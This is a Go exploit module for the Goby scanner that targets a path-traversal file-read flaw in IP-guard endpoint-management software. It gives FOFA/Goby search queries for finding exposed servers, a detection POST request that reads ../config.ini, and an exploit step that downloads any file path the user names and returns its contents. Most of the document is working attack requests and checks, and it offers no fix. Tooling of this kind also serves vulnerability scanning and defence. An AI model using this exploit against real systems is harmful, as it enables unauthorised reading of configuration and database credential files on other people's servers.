package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "IP-guard /ipg/appr/MApplyList/downloadFile_client/getdatarecord File Read Vulnerability",
    "Description": "<p>IP-guard is a terminal security management software developed by Topsec Technology Co., Ltd., aiming to assist enterprises in protecting terminal device security, data security, managing network usage, and simplifying IT system management.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "IP-Guard",
    "Homepage": "https://www.ip-guard.net/",
    "DisclosureDate": "2024-04-24",
    "PostTime": "2024-04-24",
    "Author": "1971714067@qq.com",
    "FofaQuery": "body=\"LOGIN_SUCCESS_RESTART_SERVICES\" || body=\"backup_db_store_path\" || body=\"Sign/create_vcode\" || title=\"IP-guard\"",
    "GobyQuery": "body=\"LOGIN_SUCCESS_RESTART_SERVICES\" || body=\"backup_db_store_path\" || body=\"Sign/create_vcode\" || title=\"IP-guard\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>Currently, no detailed solution is provided. Please follow the updates on the manufacturer's homepage: <a href=\"https://www.ip-guard.net/\">https://www.ip-guard.net/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "../config.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/ipg/appr/MApplyList/downloadFile_client/getdatarecord",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Length": "64",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "webconfig",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "database",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "viewcfg",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/ipg/appr/MApplyList/downloadFile_client/getdatarecord",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/ipg/appr/MApplyList/downloadFile_client/getdatarecord"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/ipg/appr/MApplyList/downloadFile_client/getdatarecord",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Length": "64",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "path={{{path}}}&filename=1&action=download&hidGuid=1v%0D%0A"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "test|lastbody|regex|([\\s\\S]*)",
                "output|define|text|获取的信息是:{{{test}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "IP-guard /ipg/appr/MApplyList/downloadFile_client/getdatarecord 文件读取漏洞",
            "Product": "IP-guard",
            "Description": "<p>IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.ip-guard.net/\">https://www.ip-guard.net/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "IP-guard /ipg/appr/MApplyList/downloadFile_client/getdatarecord File Read Vulnerability",
            "Product": "IP-Guard",
            "Description": "<p>IP-guard is a terminal security management software developed by Topsec Technology Co., Ltd., aiming to assist enterprises in protecting terminal device security, data security, managing network usage, and simplifying IT system management.<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</span></p>",
            "Recommendation": "<p>Currently, no detailed solution is provided. Please follow the updates on the manufacturer's homepage: <a href=\"https://www.ip-guard.net/\">https://www.ip-guard.net/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10944"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}